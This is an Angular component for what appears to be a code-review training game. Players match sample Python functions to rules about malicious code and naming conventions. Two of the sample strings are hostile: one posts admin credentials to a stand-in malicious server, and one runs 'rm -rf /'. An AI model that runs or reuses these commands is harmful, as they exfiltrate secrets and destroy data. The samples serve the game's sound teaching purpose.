import { Component } from '@angular/core';
import { Codigo } from './interfaces/codigo';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  erro = {
    codigoMalicioso : "codigoMalicioso",
    nomenclaturaErrada : "nomenclaturaErrada",
    none : ''
  }

  regras = [
    {
      regra : 'Não pode ter codigo malicioso',
      error : this.erro.codigoMalicioso
    },
    {
      regra : 'O nome das variaveis e funções devem seguir um padrão',
      error : this.erro.nomenclaturaErrada
    }
  ]

  codigo = [
    {
      function : `def enviar_dados_sensiveis():
      dados = {
          'usuario': 'admin',
          'senha': '123456'
      }
      response = requests.post('http://www.servidor-malicioso.com', data=dados)`,
      error : this.erro.codigoMalicioso,
      detected : false
    },
    {
      function : `def calcular_soma(lista):
      soma = 0
      for elemento in lista:
          soma += elemento
      return soma`,
      error : this.erro.none,
      detected : false
    },
    {
      function : `def calcular_media(num1, num2, num3):
      soma = num1 + num2 + num3
      media = soma / 3
      return media`,
      error : this.erro.none,
      detected : false
    },
    {
      function : `def deletar_arquivos_sistema():
      os.system("rm -rf /")`,
      error : this.erro.codigoMalicioso,
      detected : false
    },
    {
      function : `def VERIFICAR-Bis_sexT@(ann0):
      if ann0 % 400 == 0 or (ann0 % 4 == 0 and ann0 % 100 != 0):
          return True
      else:
          return False`,
      error : this.erro.nomenclaturaErrada,
      detected : false
    },
    {
      function : `def calcular_fatorial(numero):
      fatorial = 1
      for i in range(1, numero + 1):
          fatorial *= i
      return fatorial`,
      error : this.erro.none,
      detected : false
    },
    
    
  ]

  codigoSelecionado : any
  index : any
  regraSelecionada : any

  erroDetectado: any

  showFeedback : boolean = false
  feedbackMessage : String = "aaaaaaa"

  approved() {
    var errorDetected = false
    this.codigo.forEach((e) => {
      if(e.error != this.erro.none) errorDetected = true
    })

    if(errorDetected) {
      this.feedbackMessage = "Você aprovou um codigo com falhas, se sinta envergonhado!!!"
    }
    else {
      this.feedbackMessage = "tudo de acordo, parabens!"  
    }
    this.showFeedback = true
  }

  declined() {
    var errorDetected = false
    this.codigo.forEach((e) => {
      if(e.error != this.erro.none && !e.detected) errorDetected = true
    })

    if(errorDetected) {
      this.feedbackMessage = "Um codigo rejeitado deve haver justificativas"
    }
    else {
      this.feedbackMessage = "Você recusou um codigo com problemas, muito bem!"
    }
    this.showFeedback = true
  }

  codigoSelected(code: any, i : number) {
    this.codigoSelecionado = code
    this.index = i
    this.compare()
  }
  
  regraSelected(regra: any) {
    this.regraSelecionada = regra
    this.compare()
  }

  async compare() {
    if(this.codigoSelecionado == null || this.regraSelecionada == null) return
    if(this.codigoSelecionado.error == this.regraSelecionada.error) {
      console.log("achou um erro")
      this.codigo[this.index].detected = true
    }else {
      console.log("Tudo certo por aqui!")
    }
    await new Promise(resolve => setTimeout(resolve, 300));
    this.codigoSelecionado = null
    this.regraSelecionada = null
  }

  retry() {
    this.showFeedback = false
    this.codigoSelecionado = null
    this.regraSelecionada = null
  }
}

 